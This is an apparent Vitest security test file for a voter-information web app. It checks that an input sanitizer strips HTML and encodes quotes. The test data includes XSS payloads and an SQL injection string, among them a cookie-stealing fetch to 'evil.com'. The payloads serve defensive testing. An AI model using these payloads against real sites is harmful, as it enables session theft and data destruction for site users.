/**
 * Security Tests for VoteWise India
 * Tests input sanitization, XSS prevention, and content security
 */

import { describe, it, expect } from 'vitest';

/**
 * Replicates the sanitize function from geminiService for testing
 * @param {string} input - Raw user input
 * @returns {string} Sanitized input
 */
function sanitizeInput(input) {
  if (typeof input !== 'string') return '';

  return input
    .trim()
    .slice(0, 1000)
    .replace(/<[^>]*>/g, '')
    .replace(/[<>'"]/g, (char) => {
      const entities = { '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' };
      return entities[char] || char;
    });
}

describe('Security', () => {
  describe('Input Sanitization', () => {
    it('should trim whitespace', () => {
      expect(sanitizeInput('  hello  ')).toBe('hello');
    });

    it('should limit input to 1000 characters', () => {
      const longInput = 'a'.repeat(2000);
      const sanitized = sanitizeInput(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(1000);
    });

    it('should remove HTML script tags', () => {
      const xssInput = '<script>alert("xss")</script>Hello';
      const sanitized = sanitizeInput(xssInput);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('Hello');
    });

    it('should remove img tags with onerror', () => {
      const xssInput = '<img src=x onerror=alert(1)>Hello';
      const sanitized = sanitizeInput(xssInput);
      expect(sanitized).not.toContain('<img');
      expect(sanitized).toContain('Hello');
    });

    it('should remove iframe tags', () => {
      const xssInput = '<iframe src="evil.com"></iframe>Hello';
      const sanitized = sanitizeInput(xssInput);
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).toContain('Hello');
    });

    it('should handle empty string', () => {
      expect(sanitizeInput('')).toBe('');
    });

    it('should handle null input', () => {
      expect(sanitizeInput(null)).toBe('');
    });

    it('should handle undefined input', () => {
      expect(sanitizeInput(undefined)).toBe('');
    });

    it('should handle numeric input', () => {
      expect(sanitizeInput(123)).toBe('');
    });

    it('should handle boolean input', () => {
      expect(sanitizeInput(true)).toBe('');
    });

    it('should handle object input', () => {
      expect(sanitizeInput({})).toBe('');
    });

    it('should handle array input', () => {
      expect(sanitizeInput([])).toBe('');
    });

    it('should encode special characters', () => {
      const input = 'Hello "world" & \'test\'';
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain("'");
    });

    it('should handle nested HTML tags', () => {
      const input = '<div><span><script>alert(1)</script></span></div>Hello';
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('<');
      expect(sanitized).toContain('Hello');
    });

    it('should handle event handlers in tags', () => {
      const input = '<div onmouseover="alert(1)">Click</div>';
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('onmouseover');
    });

    it('should handle javascript: protocol', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('javascript:');
    });

    it('should preserve normal text content', () => {
      const input = 'How to register as a voter in India?';
      expect(sanitizeInput(input)).toBe(input);
    });

    it('should preserve Hindi text', () => {
      const input = 'भारत में मतदाता पंजीकरण कैसे करें?';
      expect(sanitizeInput(input)).toBe(input);
    });

    it('should handle mixed language input', () => {
      const input = 'EVM kya hai? ईवीएम क्या है?';
      expect(sanitizeInput(input)).toBe(input);
    });
  });

  describe('API Key Protection', () => {
    it('should not expose API keys in code', () => {
      // API keys should be loaded from environment variables
      const envKey = import.meta.env.VITE_GEMINI_API_KEY;
      // Should be from env, not hardcoded
      expect(typeof envKey === 'string' || envKey === undefined).toBe(true);
    });
  });

  describe('Content Security', () => {
    it('should sanitize consecutive malicious inputs', () => {
      const attacks = [
        '<script>document.cookie</script>',
        '<img src=x onerror=fetch("evil.com?"+document.cookie)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "';DROP TABLE users;--",
      ];

      attacks.forEach((attack) => {
        const sanitized = sanitizeInput(attack);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });
  });
});
